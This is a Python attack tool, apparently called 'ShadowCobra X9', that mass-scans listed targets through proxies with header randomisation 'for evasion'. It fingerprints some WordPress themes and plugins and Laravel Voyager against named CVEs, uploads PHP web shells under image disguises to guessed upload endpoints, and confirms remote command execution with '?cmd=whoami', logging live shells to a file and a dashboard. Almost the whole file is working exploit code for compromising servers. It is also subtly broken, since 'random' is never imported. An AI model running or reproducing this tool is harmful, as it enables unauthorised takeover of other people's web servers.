#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# ShadowCobra X9 Vulnerability Scanner
# Enhanced Edition by ShadowHax 🐍
#
# Advanced CVE scanning with auto shell upload and dashboard

import requests
import re
import os
import sys
from urllib.parse import urljoin
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import threading
import time
from tkinter import Tk, Canvas
import argparse

# Initialize colorama
init(autoreset=True)
requests.packages.urllib3.disable_warnings()

# === CONFIG ===
TARGETS_FILE = "targets.txt"  # Replace with your targets file
PROXY_FILE = "proxy.txt"      # Your proxy list
SHELL_FILES = ["shadow.php", "shell.php.jpg"]
UPLOAD_ENDPOINTS = [
    "upload.php", "upload", "file-upload.php", "uploadFile.php",
    "admin/upload.php", "dashboard/upload", "panel/upload",
    "api/upload", "backend/upload", "upload-image.php", "ajax/upload.php"
]
UPLOAD_DIRS = [
    "uploads", "upload", "files", "images", "upload/files", "uploads/images",
    "media", "assets", "tmp", "storage", "temp", "img", "userfiles", "upload_tmp",
    "uploads/tmp", "public", "upload/images", "uploads/files"
]
EXTENSIONS = [".php", ".php.jpg", ".phtml", ".phar"]
THREADS = 20
TIMEOUT = 10

# Global lists and locks
live_shells = []
dashboard_lock = threading.Lock()

# CVE Modules
CVE_MODULES = [
    {
        "CVE": "CVE-2025-26892",
        "Name": "WordPress Celestial Aura Theme v2.2",
        "Fingerprint": "/wp-content/themes/celestial-aura/style.css",
        "Regex": r"Version:\s*2\.2",
        "Upload": "/wp-content/themes/celestial-aura/upload.php"
    },
    {
        "CVE": "CVE-2025-1304",
        "Name": "WordPress NewsBlogger Theme",
        "Fingerprint": "/wp-content/themes/newsblogger/style.css",
        "Regex": r"NewsBlogger",
        "Upload": "/wp-content/themes/newsblogger/upload.php"
    },
    {
        "CVE": "CVE-2024-3452",
        "Name": "Laravel Voyager",
        "Fingerprint": "/admin/login",
        "Regex": r"Voyager",
        "Upload": "/admin/media/upload"
    },
    {
        "CVE": "CVE-2024-5681",
        "Name": "WP File Manager Plugin",
        "Fingerprint": "/wp-content/plugins/wp-file-manager/readme.txt",
        "Regex": r"File Manager",
        "Upload": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
    },
]

# Load proxies
def load_proxies(file_path):
    proxies = []
    try:
        with open(file_path, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.YELLOW}Warning: {file_path} not found. Scanning without proxies.{Style.RESET_ALL}")
    return proxies

# Banner
def banner():
    banner_text = """
╦═╗┬ ┬┌─┐┌─┐┬ ┬┬ ┬┬┌┬┐┌─┐┬─┐
╠╦╝│ ││  ├┤ ├─┤│ ││ │ ├┤ ├┬┘
╩╚═┴─┴└─┘└─┘┴ ┴└─┘┴ ┴ └─┘┴└─
   ShadowCobra X9 Vulnerability Scanner
        Enhanced Edition by ShadowHax (2025)
"""
    print(f"{Fore.CYAN}{banner_text}{Style.RESET_ALL}")

# Load targets
def load_targets(file_path):
    if not os.path.exists(file_path):
        print(f"{Fore.RED}[!] {file_path} not found!{Style.RESET_ALL}")
        sys.exit(1)
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

# Fetch URL with proxy support
def fetch_url(url, proxy=None):
    try:
        session = requests.Session()
        session.verify = False
        if proxy and proxy.startswith("socks5"):
            session.proxies = {"http": proxy, "https": proxy}
        r = session.get(url, headers=get_random_headers(), timeout=TIMEOUT)
        if r.status_code == 200:
            return r.text
    except requests.RequestException:
        pass
    return None

# Random headers for evasion
def get_random_headers():
    return {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "zh-CN,zh;q=0.7"]),
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Referer": f"http://{random.choice(['google.com', 'bing.com', 'yahoo.com'])}"
    }

# Check vulnerability module
def check_module(url, module, proxy=None):
    fp = fetch_url(url + module["Fingerprint"], proxy)
    if not fp:
        return False, "No fingerprint"
    if re.search(module["Regex"], fp, re.I):
        return exploit_upload(url, module, proxy)
    return False, "Fingerprint mismatch"

# Attempt file upload exploit
def exploit_upload(url, module, proxy=None):
    test_file = "<?php echo 'VULNTEST'; ?>"
    files = {"file": ("shadow.php", test_file, "application/x-php")}
    upload_url = url + module["Upload"]
    
    try:
        session = requests.Session()
        session.verify = False
        if proxy and proxy.startswith("socks5"):
            session.proxies = {"http": proxy, "https": proxy}
        r = session.post(upload_url, files=files, timeout=TIMEOUT)
        if r.status_code in [200, 201, 302]:
            check_url = url + "/wp-content/uploads/shadow.php"
            res = session.get(check_url, timeout=TIMEOUT)
            if "VULNTEST" in res.text:
                return True, f"{module['CVE']} ({module['Name']})"
    except requests.RequestException:
        pass
    return False, "Exploit failed"

# Check for live shells
def check_shell(base_url, shell_base, proxy=None, cmd="whoami"):
    for d in UPLOAD_DIRS:
        for ext in EXTENSIONS:
            guessed = f"{d}/{shell_base}{ext}"
            url = urljoin(base_url + "/", guessed)
            try:
                session = requests.Session()
                session.verify = False
                if proxy and proxy.startswith("socks5"):
                    session.proxies = {"http": proxy, "https": proxy}
                r = session.get(url + f"?cmd={cmd}", timeout=TIMEOUT, allow_redirects=True)
                if any(x in r.text.lower() for x in ["uid=", "daemon", "root", "www-data"]):
                    verify_url = url + "?cmd=whoami"
                    verify_r = session.get(verify_url, timeout=TIMEOUT, allow_redirects=True)
                    if "www-data" in verify_r.text.lower():
                        with dashboard_lock:
                            if verify_url not in live_shells:  # Avoid duplicates
                                live_shells.append(verify_url)
                        print(f"{Fore.RED}[!!!] LIVE SHELL (Verified www-data): {verify_url}{Style.RESET_ALL}")
                        with open("live_shells.txt", "a") as out:
                            out.write(verify_url + "\n")
                        if len(verify_r.history) > 0:
                            print(f"{Fore.YELLOW}  Redirect chain: {verify_r.url} (final){Style.RESET_ALL}")
                            for resp in verify_r.history:
                                print(f"{Fore.YELLOW}  -> {resp.url} (status: {resp.status_code}){Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}[?] Potential shell at {url}, but no www-data: {verify_r.text[:50]}...{Style.RESET_ALL}")
                else:
                    with open("debug_shell_hits.txt", "a") as dbg:
                        dbg.write(f"{url}\n")
            except requests.RequestException as e:
                print(f"{Fore.YELLOW}Error checking {url}: {e}{Style.RESET_ALL}")
                continue
    return None

# Process a single target
def process_target(target, proxy=None, silent=False, cmd="whoami", use_https=False):
    base_url = f"https://{target}" if use_https else f"http://{target}"
    if not silent:
        print(f"\n{Fore.BLUE}[*] Scanning {base_url}{Style.RESET_ALL}")

    # Check CVE modules
    for module in CVE_MODULES:
        vuln, msg = check_module(base_url, module, proxy)
        if vuln:
            if not silent:
                print(f"{Fore.RED}[VULNERABLE] {base_url} → {msg}{Style.RESET_ALL}")
            # Attempt shell upload and check
            for shell in SHELL_FILES:
                if os.path.exists(shell):
                    for endpoint in UPLOAD_ENDPOINTS:
                        if upload_shell(base_url, endpoint, shell, proxy):
                            shell_base = os.path.splitext(shell)[0]
                            check_shell(base_url, shell_base, proxy, cmd)
                            break
                else:
                    if not silent:
                        print(f"{Fore.RED}[!] Missing shell: {shell}{Style.RESET_ALL}")
                    break
        elif not silent:
            print(f"{Fore.GREEN}[SAFE] {base_url} → {msg}{Style.RESET_ALL}")

    if not any(vuln for module in CVE_MODULES for vuln, _ in [check_module(base_url, module, proxy)]) and not silent:
        print(f"{Fore.YELLOW}[INFO] {base_url} → No known CVEs matched{Style.RESET_ALL}")

# Upload shell
def upload_shell(base_url, endpoint, shell_file, proxy=None):
    upload_url = urljoin(base_url + "/", endpoint)
    try:
        with open(shell_file, "rb") as f:
            files = {"file": (shell_file, f, "image/jpeg")}
            session = requests.Session()
            session.verify = False
            if proxy and proxy.startswith("socks5"):
                session.proxies = {"http": proxy, "https": proxy}
            r = session.post(upload_url, files=files, timeout=TIMEOUT)
            if r.status_code in [200, 201, 302, 403]:
                if not silent:
                    print(f"{Fore.GREEN}[+] Uploaded {shell_file} to: {upload_url}{Style.RESET_ALL}")
                return True
    except requests.RequestException:
        pass
    return False

# Update dashboard
def update_dashboard():
    root = Tk()
    root.title("ShadowCobra X9 Dashboard")
    canvas = Canvas(root, width=800, height=600, bg="black")
    canvas.pack()
    while True:
        with dashboard_lock:
            canvas.delete("all")
            canvas.create_text(400, 20, text="Live Shells (Verified www-data)", fill="green", font=("Arial", 14))
            y = 50
            for i, shell in enumerate(live_shells):
                canvas.create_text(400, y + i * 20, text=shell, fill="white", font=("Arial", 10), anchor="center")
        root.update()
        time.sleep(1)  # Update every second
    root.mainloop()

# Main function
def main():
    parser = argparse.ArgumentParser(description="ShadowCobra X9 Vulnerability Scanner - Enhanced Edition")
    parser.add_argument("--silent", action="store_true", help="Run in silent mode (suppress output except LIVE SHELL)")
    parser.add_argument("--cmd", default="whoami", help="Command to execute via shell (default: whoami)")
    parser.add_argument("--https", action="store_true", help="Force HTTPS requests")
    args = parser.parse_args()

    banner()
    targets = load_targets(TARGETS_FILE)
    proxies = load_proxies(PROXY_FILE)

    if not targets:
        print(f"{Fore.RED}[!] No targets found in {TARGETS_FILE}!{Style.RESET_ALL}")
        sys.exit(1)

    # Start dashboard in a separate thread
    dashboard_thread = threading.Thread(target=update_dashboard, daemon=True)
    dashboard_thread.start()

    # Distribute proxies across targets if available
    proxy_cycle = (proxies * (len(targets) // len(proxies) + 1))[:len(targets)] if proxies else [None] * len(targets)

    # Global silent flag for upload_shell
    global silent
    silent = args.silent

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        list(tqdm(executor.map(lambda x, p: process_target(x, p, args.silent, args.cmd, args.https), targets, proxy_cycle), total=len(targets), disable=args.silent))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan stopped by user{Style.RESET_ALL}")
        sys.exit(0)
